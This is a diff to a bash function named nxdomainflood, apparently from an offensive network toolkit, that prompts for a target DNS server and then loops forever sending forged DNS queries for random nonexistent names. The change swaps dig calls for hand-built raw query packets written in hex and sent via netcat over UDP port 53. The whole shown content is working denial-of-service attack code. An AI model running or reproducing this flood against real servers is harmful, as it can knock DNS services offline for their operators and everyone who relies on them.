@@ -1042,15 +1042,48 @@ nxdomainflood()
 echo "Enter the IP address of the target DNS server:"
 read -i $DNSTARGET -e DNSTARGET
 echo "Starting DNS NXDOMAIN Query Flood to $DNSTARGET" && sleep 1
+#loop forever!
 while :
-TLDLIST=(com br net org $RANDOM au co jp cn ru in ir ua ca xyz site top icu vip online de)
 do
+#create transaction ID for DNS query
+TRANS=$RANDOM
+#convert to hex
+printf -v TRANSID "%x\n" "$TRANS"
+#cut it into bytes
+TRANSID1=$(echo $TRANSID|cut -b 1,2|xargs)
+TRANSID2=$(echo $TRANSID|cut -b 3,4|xargs)
+#if single byte or no byte, prepend 0
+if [[ ${#TRANSID1} = "1" ]]
+then
+TRANSID1=0$TRANSID
+elif [[ ${#TRANSID2} = "0" ]]
+then
+TRANSID2=00
+elif [[ ${#TRANSID2} = "1" ]] 
+then
+TRANSID2=0$TRANSID
+fi
+#now we have transaction ID, generate random alphanumeric name to query
+TLDLIST=(com br net org cz au co jp cn ru in ir ua ca xyz site top icu vip online de)
 TLD=(${TLDLIST[RANDOM%21]})
 RANDLONG=$((RANDOM % 20 +1))
 STRING=$(< /dev/urandom tr -dc [:alnum:] | head -c$RANDLONG)
-dig $RANDOM.$STRING.$TLD @$DNSTARGET
-dig $RANDOM.$TLD @$DNSTARGET
-dig $STRING.$TLD @$DNSTARGET
+#calculate length of name we are querying as hex
+STRINGLEN=(${#STRING})
+printf -v STRINGLENHEX "%x\n" "$STRINGLEN"
+STRINGLENHEX=$(echo $STRINGLENHEX|xargs)
+if [[ ${#STRINGLENHEX} = "1" ]]
+then 
+STRINGLENHEX=0$STRINGLENHEX
+fi
+#do the same for TLD
+TLDLEN=(${#TLD})
+printf -v TLDLENHEX "%x\n" "$TLDLEN"
+TLDLENHEX=$(echo $TLDLENHEX|xargs)
+#forge a DNS request and send to netcat
+ATTACKSTRING="\x$TRANSID1\x$TRANSID2\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x$STRINGLENHEX$STRING\x$TLDLENHEX$TLD\x00\x00\x01\x00\x01"
+#echo $ATTACKSTRING
+echo -n -e $ATTACKSTRING | nc -u -w0 $DNSTARGET 53
 done
 exit 0
 }
